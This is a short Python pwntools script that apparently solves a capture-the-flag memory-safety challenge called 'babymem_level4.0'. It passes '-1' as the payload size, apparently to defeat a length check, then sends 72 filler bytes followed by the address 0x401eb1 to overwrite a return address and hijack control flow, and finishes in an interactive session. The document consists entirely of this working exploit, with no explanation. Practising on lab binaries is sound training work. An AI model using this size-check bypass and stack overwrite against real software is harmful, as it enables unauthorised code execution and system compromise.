from pwn import *

p = process('/challenge/babymem_level4.0')

p.recvuntil('Payload size:')
p.sendline(b'-1')

payload = b'a' * 72 + p64(0x401eb1) 

#p.recvline('Send your payload')
p.sendline(payload)

p.interactive()

